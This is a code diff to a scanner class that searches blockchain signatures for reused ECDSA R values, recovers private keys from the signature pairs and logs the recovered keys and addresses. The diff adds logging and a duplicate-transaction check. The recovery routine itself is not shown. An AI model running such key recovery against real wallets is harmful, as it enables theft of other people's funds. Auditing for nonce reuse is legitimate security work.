@@ -696,15 +696,23 @@ class RValueScanner:
             reused_count = 0
             recovered_keys = []
             
+            await self.add_log(scan_id, f"Analyzing {len(signatures_by_r)} unique R values for reuse...")
+            
             for r_value, signatures in signatures_by_r.items():
                 if len(signatures) >= 2:  # R value reused
                     reused_count += 1
-                    await self.add_log(scan_id, f"Found reused R value: {r_value[:16]}...", "warning")
+                    await self.add_log(scan_id, f"🔥 REUSED R VALUE FOUND: {r_value[:16]}... used {len(signatures)} times", "warning")
                     
                     # Try to recover private key from each pair
                     for i in range(len(signatures)):
                         for j in range(i + 1, len(signatures)):
                             sig1, sig2 = signatures[i], signatures[j]
+                            
+                            # Skip if same transaction (shouldn't happen but be safe)
+                            if sig1["tx_id"] == sig2["tx_id"] and sig1["input_index"] == sig2["input_index"]:
+                                continue
+                            
+                            await self.add_log(scan_id, f"Attempting key recovery from TXs: {sig1['tx_id'][:16]}... and {sig2['tx_id'][:16]}...")
                             
                             private_key = self.crypto.recover_private_key(
                                 r_value, sig1["s"], sig2["s"],
@@ -729,16 +737,25 @@ class RValueScanner:
                                     s2_value=sig2["s"],
                                     message1_hash=sig1["message_hash"],
                                     message2_hash=sig2["message_hash"],
-                                    validation_status="unknown"
+                                    validation_status="recovered"
                                 )
                                 
                                 recovered_keys.append(recovered_key)
                                 scan_states[scan_id]["keys_recovered"] += 1
                                 
-                                await self.add_log(scan_id, f"Recovered private key: {private_key[:16]}...", "success")
+                                await self.add_log(scan_id, f"🔑 PRIVATE KEY RECOVERED: {private_key[:16]}...", "success")
+                                await self.add_log(scan_id, f"   Compressed: {compressed_addr}", "success")
+                                await self.add_log(scan_id, f"   From R value: {r_value[:32]}...", "info")
+                            else:
+                                await self.add_log(scan_id, f"Key recovery failed for this signature pair", "warning")
             
             scan_states[scan_id]["r_reuse_pairs"] = reused_count
             scan_states[scan_id]["recovered_keys"] = recovered_keys
+            
+            if reused_count > 0:
+                await self.add_log(scan_id, f"🎯 ANALYSIS COMPLETE: {reused_count} reused R values found, {len(recovered_keys)} private keys recovered", "success")
+            else:
+                await self.add_log(scan_id, "No reused R values found in this scan range", "info")
             
         except Exception as e:
             logger.error(f"Error finding reused R values: {e}")
